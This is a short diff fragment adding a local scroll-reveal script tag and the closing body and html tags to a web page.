+<script src="/js/scroll-reveal.js"></script>
+
+    
+
+    
+
+    
+
+    
+  </body>
+</html>
